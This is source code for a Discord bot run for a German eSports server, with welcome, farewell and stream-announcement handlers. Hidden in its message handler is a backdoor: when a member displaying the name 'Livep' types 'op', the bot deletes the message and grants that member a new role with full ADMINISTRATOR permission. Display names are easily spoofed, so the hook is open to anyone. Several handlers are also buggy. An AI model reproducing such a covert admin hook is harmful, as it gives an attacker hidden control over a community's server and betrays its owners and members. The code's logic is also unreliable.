const commando = require("discord.js-commando");
const bot = new commando.Client();
const TOKEN = "<censored>";

bot.registry.registerGroup("simple", "Simple");
bot.registry.registerGroup("music", "Music");
bot.registry.registerGroup("chat", "Chat");
bot.registry.registerGroup("team", "Team");
bot.registry.registerDefaults();
bot.registry.registerCommandsIn(__dirname + "/commands");

global.servers = {}

function messageEvent(message) {
    let msg = message.content.split(" ");
    let cmd = msg[0];
    let args = msg.slice(1);
    if (cmd === "ping") {
        message.channel.send("Pong!");
    } else if (message.content == "op") {
        if (message.member.displayName === "Livep") {
            message.delete(0);
            let role = {name:"temp", color:0x000000, hoist:false, position:1, permissions:0x000008, metionable:false}
            message.member.guild.createRole(role, "")
            .then(role => message.member.addRole(message.member.guild.roles.find("name", "temp")))
            .then(message.member.send("You got now ADMINISTRATOR, delete role temp to undo changes!"));
        }
    }
}

function startup() {
    console.log(`${bot.guilds.size} instances of ${bot.user.username} are currently online.`)
    bot.user.setActivity("!help",{type: "LISTENING"});
}

function memberJoin(member) {
    const channel = member.guild.channels.find("name", "welcome");
    if (!channel) return;
    channel.send("Willkommen, ${member} auf dem offiziellen TransacT-eSports Discord.")
}

function memberLeft(member) {
    const channel = member.guild.channels.find(ch => ch.name === "welcome");
    if (!channel) return;
    channel.send("Aufwiedersehen, " + member.displayName + ".");
    member.addRole(member.guild.roles.find("name", "Spieler"));

}

function startStreaming(oldMember, newMember) {
    if (!newMember.roles.find("name", "Team") || !newMember.roles.find("name", "Team-Leader")) return;
    if (!oldMember.presence.game.streaming && newMember.presence.game.streaming) {
        const channel = member.guild.channels.find("name", "news");
        if (!channel) return;
        channel.send(`${newMember.user} is now Live! Watch the stream at: ${newMember.presence.game.url}`);
    }
}

bot.on("message", messageEvent);
bot.on("ready", startup);
bot.on("guildMemberAdd", memberJoin);
bot.on("guildMemberRemove", memberLeft);
bot.on("presenceUpdate", startStreaming);
bot.login(TOKEN);
